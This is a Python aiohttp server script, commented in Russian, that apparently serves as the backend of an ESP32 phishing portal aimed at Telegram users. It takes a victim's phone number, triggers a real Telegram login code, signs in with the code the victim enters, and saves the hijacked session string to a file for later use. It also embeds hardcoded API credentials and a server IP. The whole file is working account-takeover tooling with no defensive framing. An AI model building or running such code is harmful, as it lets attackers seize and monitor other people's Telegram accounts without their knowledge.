# server.py для хоста 188.225.11.61
import asyncio
import json
import random
import string
import os
from aiohttp import web
from telethon import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# Твои данные
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"

# Хранилище сессий
sessions = {}
active_clients = {}

# Генерация ID сессии
def generate_session_id():
    return ''.join(random.choices(string.digits + string.ascii_lowercase, k=12))

async def handle_auth_start(request):
    """Начало авторизации - запрос номера телефона"""
    try:
        data = await request.json()
        phone = data.get('phone', '').strip()
        
        if not phone or len(phone) < 11:
            return web.json_response({"error": "Invalid phone number"}, status=400)
        
        # Генерируем ID сессии
        session_id = generate_session_id()
        
        # Создаем клиент Telegram
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        
        # Подключаемся и запрашиваем код
        await client.connect()
        sent_code = await client.send_code_request(phone)
        
        # Сохраняем данные сессии
        sessions[session_id] = {
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash,
            'client': client,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"[+] Auth started for {phone}, session: {session_id}")
        
        return web.json_response({
            "status": "code_sent",
            "session_id": session_id,
            "message": "Код отправлен в Telegram"
        })
        
    except Exception as e:
        print(f"[!] Error in auth start: {str(e)}")
        return web.json_response({"error": str(e)}, status=500)

async def handle_auth_code(request):
    """Проверка кода подтверждения"""
    try:
        data = await request.json()
        session_id = data.get('session_id', '').strip()
        code = data.get('code', '').strip()
        
        if not session_id or session_id not in sessions:
            return web.json_response({"error": "Invalid session"}, status=400)
        
        if not code or len(code) < 5:
            return web.json_response({"error": "Invalid code"}, status=400)
        
        session_data = sessions[session_id]
        client = session_data['client']
        
        try:
            # Пробуем войти с кодом
            await client.sign_in(
                phone=session_data['phone'],
                code=code,
                phone_code_hash=session_data['phone_code_hash']
            )
            
            # Получаем строку сессии
            session_string = client.session.save()
            
            # Сохраняем в файл
            filename = f"telegram_session_{session_id}.txt"
            with open(filename, 'w') as f:
                f.write(session_string)
            
            # Сохраняем session string для дальнейшего использования
            session_data['session_string'] = session_string
            session_data['authenticated'] = True
            session_data['auth_time'] = datetime.now().isoformat()
            
            print(f"[+] Auth successful for session {session_id}")
            print(f"[+] Session saved to {filename}")
            
            # Отключаем клиент
            await client.disconnect()
            
            # Очищаем из активных сессий через 5 минут
            asyncio.create_task(cleanup_session(session_id))
            
            return web.json_response({
                "status": "success",
                "message": "Авторизация успешна",
                "session_file": filename,
                "phone": session_data['phone']
            })
            
        except Exception as e:
            error_msg = str(e)
            print(f"[!] Code verification failed: {error_msg}")
            
            if "phone_code_invalid" in error_msg:
                return web.json_response({
                    "status": "error",
                    "message": "Неверный код"
                }, status=400)
            elif "phone_code_expired" in error_msg:
                return web.json_response({
                    "status": "error",
                    "message": "Код устарел"
                }, status=400)
            else:
                return web.json_response({
                    "status": "error",
                    "message": f"Ошибка: {error_msg}"
                }, status=400)
                
    except Exception as e:
        print(f"[!] Error in auth code: {str(e)}")
        return web.json_response({"error": str(e)}, status=500)

async def handle_check_session(request):
    """Проверка активной сессии"""
    try:
        data = await request.json()
        session_id = data.get('session_id', '')
        
        if session_id in sessions and sessions[session_id].get('authenticated'):
            return web.json_response({
                "status": "authenticated",
                "phone": sessions[session_id]['phone']
            })
        else:
            return web.json_response({
                "status": "not_found"
            }, status=404)
            
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

async def cleanup_session(session_id):
    """Очистка сессии через 5 минут"""
    await asyncio.sleep(300)  # 5 минут
    if session_id in sessions:
        try:
            client = sessions[session_id].get('client')
            if client and client.is_connected():
                await client.disconnect()
        except:
            pass
        del sessions[session_id]
        print(f"[-] Session {session_id} cleaned up")

async def handle_health(request):
    """Проверка здоровья сервера"""
    return web.json_response({
        "status": "online",
        "sessions_count": len(sessions),
        "timestamp": datetime.now().isoformat()
    })

async def start_server():
    """Запуск сервера"""
    app = web.Application()
    
    # Регистрируем маршруты как у тебя в ESP32 коде
    app.router.add_post('/auth/start', handle_auth_start)  # ESP32: /auth → HOST:5000/auth/start
    app.router.add_post('/auth/code', handle_auth_code)    # ESP32: /code → HOST:5000/auth/code
    app.router.add_get('/health', handle_health)
    
    # CORS для работы с ESP32
    async def cors_middleware(app, handler):
        async def middleware_handler(request):
            if request.method == 'OPTIONS':
                response = web.Response()
            else:
                response = await handler(request)
            
            response.headers['Access-Control-Allow-Origin'] = '*'
            response.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return response
        return middleware_handler
    
    app.middlewares.append(cors_middleware)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    # Используем порт 5000 как у тебя в коде
    site = web.TCPSite(runner, '0.0.0.0', 5000)
    await site.start()
    
    print(f"\n{'='*60}")
    print("🔥 TELEGRAM AUTH SERVER STARTED")
    print(f"{'='*60}")
    print(f"📍 IP: 188.225.11.61")
    print(f"🚪 Port: 5000")
    print(f"📞 API ID: {API_ID}")
    print(f"🔑 API Hash: {API_HASH[:8]}...")
    print(f"{'='*60}")
    print("\n📋 Available endpoints:")
    print("  POST /auth/start  - Start auth with phone number")
    print("  POST /auth/code   - Verify Telegram code")
    print("  GET  /health      - Server status check")
    print(f"\n🛜 ESP32 Portal URL: http://188.225.11.61:5000")
    print(f"{'='*60}\n")
    
    return runner

async def main():
    # Проверяем установку telethon
    try:
        print("[*] Checking dependencies...")
        import telethon
        print("[✓] Telethon installed")
    except ImportError:
        print("[!] Telethon not installed. Run: pip install telethon aiohttp")
        return
    
    # Запускаем сервер
    runner = await start_server()
    
    try:
        # Бесконечная работа
        await asyncio.Future()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        await runner.cleanup()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Server stopped")